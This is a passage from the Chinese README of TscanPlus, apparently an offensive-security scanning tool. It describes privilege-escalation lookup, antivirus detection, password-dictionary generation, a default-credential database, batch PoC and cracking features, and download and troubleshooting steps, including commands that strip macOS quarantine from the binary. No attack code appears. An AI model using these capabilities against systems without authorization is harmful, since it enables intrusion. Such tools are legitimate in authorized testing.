TscanPlus内置资产分拣、Windows提权辅助、杀软查询等工具。

##### **【资产分拣】**

一键提取资产中的主域名、子域名、IP、URL、Tscan/Fscan结果，并提供收缩模式和C段分拣。

**子域名&IP地址(收缩模式)是所有【未指定端口】的子域名和IP地址的集合。在收缩模式下，类似ip:port或domain:port这种指定端口的资产会被剔除。**

<div align=center><img src=images/image-20240617181411005.png width=80% ></div>

##### **【密码生成】**

提供了三种密码生成方式，包括社工字典生成、组织方式和枚举模式。可根据需求不同来生成更有针对性的字典文件。

<div align=center><img src=images/01.png width=80% ></div>

##### **【密码查询】**

内置了10733条常见设备和产品的默认账号密码，可直接进行查询并导出。

<div align=center><img src=images/02.png width=80% ></div>

##### **【提权辅助】**

根据systeminfo信息查询未修补的漏洞信息，返回漏洞微软编号、补丁编号、漏洞描述、影响系统等信息。

<div align=center><img src=images/image-20231221142455293.png width=80% ></div>

##### **【杀软查询】**

根据windows的tasklist信息，匹配杀软进程，内置1042条杀软识别规则。返回进程名称、进程ID、杀软名称等信息。

<div align=center><img src=images/image-20231221142616501.png width=80% ></div>


#### 14、其他功能

#####  **【导出功能】**

1、在所有功能模块中，新增了导出excel功能，默认会保存在程序根目录下。

2、在所有功能模块中，可对所有列内容进行排序和个过滤。

3、在所有功能模块中，可多选或全选模板，并进行批量操作，如进行poc检测、密码破解、目录枚举等。

4、对软件执行过程中发现的所有资产、威胁进行实时保存，保存路径为程序所有在根目录下的result.txt文件中。

<div align=center><img src=images/image-20240111144248390.png width=80% ></div>

<div align=center><img src=images/image-20240111144635519.png width=80% ></div>

##### **【数据库管理】**

可对所有数据进行持久存储和使用。默认DB文件会在config文件下生成。

<div align=center><img src=images/image-20240327165547238.png width=80% ></div>

##### 【配置管理】

对各功能配置参数写入配置文件，参数修改后只要执行一次相应功能就会写入配置文件，下次无需再次修改。

<div align=center><img src=images/image-20240327165714901.png width=80% ></div>

红队命令、上线命令、默认密码等可自定义添加，并保存在配置文件。

<div align=center><img src=images/image-20240327165814782.png width=80% ></div>

##### 【主题设置】

增加系统主题设定，在任意页面打开"高级配置"，可对系统主题进行配置，选择深色或浅色模式。（该功能基于wails框架，mac兼容较好，在windows部分系统上应用可能存在问题）

<div align=center><img src=images/image-20240327165922789.png width=80% ></div>

Mac系统下的的深色和浅色主题对比。

<div align=center><img src=images/image-20240327172657687.png width=80% ></div>

##### 【日志功能】

增加日志功能，在About页面右侧可实时显示最新程序日志，该日志文件默认存储于“高级配置”—“导出目录”文件夹下，文件名为`TscanPlus-Result.txt`。

<div align=center><img src=images/image-20240830151748990.png width=80% ></div>

### 软件下载

Github下载：https://github.com/TideSec/TscanPlus/releases    知识星球：下方二维码（更多、更新版本）

部分功能还在完善（子域名模块、POC自定义功能等），目前暂不提供源码，这里打包了windows/mac/linux三个版本的TscanPlus供下载。

本次编译的均为x64_AMD架构，有需要x86版本或ARM版的可到星球下载。

**后续版本更新和Bug反馈也会第一时间在星球进行更新。**



<div align=center><img src=images/zsxq.png width=50% ></div>




### 致谢

工具开发中参考了很多知名的Go检测工具和指纹识别软件，在此一并感谢。

- YHY大佬的承影项目：https://github.com/yhy0/ChYing 
- qwtd大佬的Slack项目：https://github.com/qiwentaidi/Slack
- 影舞者大佬的fscan项目：https://github.com/shadow1ng/fscan 
- zhzyker大佬的dismap项目：https://github.com/zhzyker/dismap 
- ServerScan项目：https://github.com/Adminisme/ServerScan 

### FAQ

**1、关于Key认证问题**

（1）只有初次进行Key校验的时候才需要联网(连接到poc.tidesec.com)认证，认证成功后不再需要再联网校验。

（2）每个Key只能使用一个客户端，目前主要结合网卡等硬件序列号进行匹配，所以当硬件更换时可能导致认证失败。

（3）Key认证只是为了能让poc使用和搜集形成良性循环，"取之于众，用之于众"，建议大家手头有poc的可以提交poc。

**2、MacOS安装问题**

Mac上可能遇到不少执行问题，如「xxx已损坏，无法打开，您应该将它移到废纸篓」、「打不开xxx，因为 Apple 无法检查其是否包含恶意软件」、「打不开 xxx，因为它来自身份不明的开发者」，可参考下面两篇文章，基本能解决95%的问题。

https://cloud.tencent.com/developer/article/2216717?areaId=106001  【苹果电脑安装软件后，提示mac文件已损坏,无法打开怎么办？】

https://sysin.org/blog/macos-if-crashes-when-opening/    【macOS 提示：“应用程序” 已损坏，无法打开的解决方法总结】

目前Mac遇到的比较多的就是闪退问题，执行下面的命令即可解决：

`sudo xattr -r -d com.apple.quarantine TscanPlus_darwin_amd64_v1.0.app`

如果还是不行，再执行这个：

`sudo codesign --sign - --force --deep TscanPlus_darwin_amd64_v1.0.app`

**3、Windows依赖WebView2环境**

**（1）系统缺少WebView2环境**

Wails打包的程序在Windows上运行时依赖 [Microsoft WebView2](https://developer.microsoft.com/zh-cn/microsoft-edge/webview2/?form=MA13LH#download)

默认情况下Windows11和win2012会安装，但有些旧机器(如Win2k8)不会，如机器没有webview2环境，程序会引导下载安装webview2。

可自行手动下载：https://developer.microsoft.com/zh-cn/microsoft-edge/webview2/?form=MA13LH#download

**（2）安装了WebView2但执行报错**

如果执行后遇到报错`The WebView2 process crashed and the application needs to be restarted.`

<div align=center><img src=images/21.png width=50% ></div>

此时需要卸载本机webview2后重新安装：https://developer.microsoft.com/zh-cn/microsoft-edge/webview2/?form=MA13LH#download

**（3）webview2无法卸载重装**

如果webview2无法卸载，这时需要借助一个小工具[【Windows11轻松设置】](https://github.com/TideSec/TscanPlus/blob/main/soft/Windows11_Tools.7z)

<div align=center><img src=https://github.com/user-attachments/assets/3d950d77-a188-4bb2-b8e9-1b1f1acdb8d8 width=70% ></div>

<div align=center><img src=https://github.com/user-attachments/assets/5a4da4be-7d37-4c3b-af1e-193e43a74cad width=70% ></div>

借助该工具可对webview2进行彻底卸载，之后再重新安装即可。

**（4）重装后仍无法打开的情况**

如果在webview2重装后仍无法打开，没有任何提示，可能是webview2和某些特定版本的windows系统再加上wails的go-webview2库融合导致的Bug，为此，在这里专门打包了一个针对webview2问题的改进版，可以尝试一下。

<div align=center><img src=https://github.com/user-attachments/assets/15d0c7f2-76c1-4359-8556-8f5232158f2b width=70% ></div>

<div align=center><img src=https://github.com/user-attachments/assets/f5a0bd0a-2c26-45f9-96e0-4471b7e0db83 width=70% ></div>

**4、Linux版运行报错**

Linux版（AMD64和Arm64版本）是基于Kali 2023/2024系统进行编译，经测试可兼容Kali2023之后版本以及Ubuntu22.04。

**另外，Linux版执行要在桌面环境下执行，ssh远程连接环境是没法执行的。**

对Ubuntu22.04之前的系统和部分Kali2024.03，可能出现的报错：

（1）报错信息：`libc.so.6: version 'GLIBC_2.34' not found`，此时需额外安装libc6库，可参考https://blog.csdn.net/huazhang_001/article/details/128828999

（2）报错信息：`libwebkit2gtk-4.0.so.37: cannot open shared object file`，此时需要安装`libwebkit2gtk`库，ubuntu下可尝试执行`apt-get install libwebkit2gtk-4.0-dev`

如果安装`apt-get install libwebkit2gtk-4.0-dev`时报错

```
apt install libwebkit2gtk-4.0-dev
Error: Unable to locate package libwebkit2gtk-4.0-dev
Error: Couldn't find any package by glob 'libwebkit2gtk-4.0-dev'
```

那么需要依次执行`vi /etc/apt/sources.list`

在`/etc/apt/sources.list`文件中加入这行
```
deb http://gb.archive.ubuntu.com/ubuntu jammy main   
```
之后再执行
```
apt update
apt install libwebkit2gtk-4.0-dev
```

如果`apt update`更新报错  `Warning: GPG error: http://gb.archive.ubuntu.com/ubuntu jammy InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY 871920D1991BC93C`

那么需要执行`apt-key adv --keyserver keyserver.ubuntu.com --recv-keys  871920D1991BC93C`，注意更换最后的Key。

之后再执行`apt update`。

如果执行`apt install libwebkit2gtk-4.0-dev`时提示
```
libturbojpeg0 : conflicts: libjpeg-turbo8 but 2.1.2-0ubuntu1 is to be installed
E: Error, pkgProblemResolver ::Resolve generated breaks, this may be caused byheld packages.
```
<div align=center><img src=images/image-20241218143050793.png width=50% ></div>

那么需要依次执行下面命令
```
apt-get remove libjpeg-turbo8
apt-get remove libturbojpeg0
```
之后再执行`apt install libwebkit2gtk-4.0-dev`即可，`libwebkit2gtk-4.0-dev`安装成功后即可正常打开。

`libwebkit2gtk-4.0-dev`安装成功后，使用`apt list | grep libwebkit2gtk`命令应可以看到`libwebkit2gtk-4.0-dev`库已被成功安装。

<div align=center><img src=images/image-20241218143353349.png width=50% ></div>

不过Linux的库依赖问题就是个玄学，不建议过度折腾，建议Kali2023之后版本以及Ubuntu22.04。

**5、Windows杀软报病毒问题**

程序使用Go开发，Windows版本使用upx进行了加壳，杀软可能会报毒，请自行排查。

**6、程序打开后看不到上方标签栏**

目前已经在欢迎页面增加"全屏"按钮，方便windows用户一键最大化。

在个别电脑上打开后，只能看到TscanPlus的中间部分，看不到上方标签栏，这可能是由于电脑分辨率较低或设置了缩放率而导致。这时需要将分辨率修改为1440*1080以上，同时将缩放率修改为100%即可。

**7、其他软件bug可提到Github的Issue或知识星球中，后续会逐一修复。**



### Star History

[![Star History Chart](https://api.star-history.com/svg?repos=TideSec/TscanPlus&type=Date)](https://star-history.com/#TideSec/TscanPlus&Date)

[url-docen]: README_EN.md

[url-TscanClient]: TscanClient.md